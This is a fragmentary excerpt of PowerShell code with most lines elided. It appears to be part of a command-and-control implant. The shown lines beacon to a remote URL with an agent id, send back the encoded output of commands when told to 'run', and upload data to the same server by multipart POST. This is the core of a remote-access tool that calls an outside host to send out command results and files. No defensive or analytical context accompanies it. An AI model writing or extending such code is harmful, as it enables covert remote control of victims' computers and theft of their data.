...
$hello=(Invoke-WebRequest "$url/ENDPOINT?MODE=res&RESPONSE=$EncHello&id=$id")
...
if ($act -eq "run")
	...
	$gimme=(Invoke-WebRequest "$url/ENDPOINT?MODE=res&RESPONSE=$EncOutput&id=$id")
        continue
    }
...
$resup=(Invoke-WebRequest "$url/ENDPOINT?MODE=res&RESPONSE=$Encd&id=$id")
$up=(Invoke-RestMethod -Uri "$url/ENDPOINT?MODE=up&id=$id" -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines)
